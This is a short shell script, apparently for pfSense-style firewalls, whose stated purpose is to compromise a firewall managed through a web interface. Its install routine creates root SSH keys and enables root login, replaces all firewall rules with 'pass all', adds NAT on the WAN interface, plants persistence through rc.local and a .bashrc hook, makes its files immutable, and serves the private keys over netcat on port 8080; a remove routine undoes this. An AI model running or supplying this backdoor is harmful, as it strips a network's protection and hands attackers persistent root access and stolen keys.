#!/bin/sh 

#Date:1/26/2025 @12:26 hours
#Purpose compromise a network firewall administered using a web gui/web application.
#Author: Tyler K Monroe aka tman904

install()
{

	mkdir /root/.ssh
	cd /root/.ssh
	ssh-keygen -t rsa -b 4096
	cat id_rsa.pub > authorized_keys
	tar cf /root/keys.tar /root/.ssh/id_rsa*
	wan=`grep -A12 "<wan>" /conf/config.xml |grep "<if>" |cut -d '>' -f2 |cut -d '<' -f1`
	echo "pass all" |pfctl -Ref -
	echo "nat on $wan from any to any -> ($wan)" |pfctl -Nef -
	cp /etc/ssh/sshd_config /etc/ssh/sshd_config.back
	echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
	/etc/rc.d/sshd onerestart
	echo "/root/.bashrc rehash > /dev/null 2>&1" >/etc/rc.local
	chmod +x /etc/rc.local
	cp /root/pwn.sh /sbin
	chflags schg /sbin/pwn.sh
	chflags schg /root/.ssh/id_rsa*
	chflags schg /root/.ssh/authorized_keys
	chflags schg /etc/ssh/sshd_config
	chflags schg /etc/ssh/sshd_config.back
	chflags schg /etc/rc.local
	cat /root/keys.tar |nc -l 8080
	rm /root/keys.tar
	mv /root/pwn.sh /root/.bashrc
	chmod +x /root/.bashrc
	chflags schg /root/.bashrc

}


remove()
{

	chflags noschg /sbin/pwn.sh
	chflags noschg /root/.ssh/id_rsa*
	chflags noschg /root/.ssh/authorized_keys
	chflags noschg /etc/ssh/sshd_config
	chflags noschg /etc/rc.local
	chflags noschg /root/.bashrc
	chflags noschg /etc/ssh/sshd_config.back
	cp /etc/ssh/sshd_config.back /etc/ssh/sshd_config
	rm /sbin/pwn.sh
	rm -rf /root/.ssh
	rm /etc/rc.local
	cp /root/.bashrc /root/pwn.sh
	rm /root/.bashrc
	rm /etc/ssh/sshd_config.back
	/etc/rc.d/sshd onestop

}
	

reload()
{

	wan=`grep -A12 "<wan>" /conf/config.xml |grep "<if>" |cut -d '>' -f2 |cut -d '<' -f1`

	echo "pass all" |pfctl -Ref -
	echo "nat on $wan from any to any -> ($wan)" |pfctl -Nef -
	/etc/rc.d/sshd onerestart

}

option="${1}"

case    ${option} in
	i)
	install
	;;
	r)
	remove
	;;
	rehash)
	reload
	;;
	*)
	echo "valid options are i for install and r for remove"
	;;
esac	
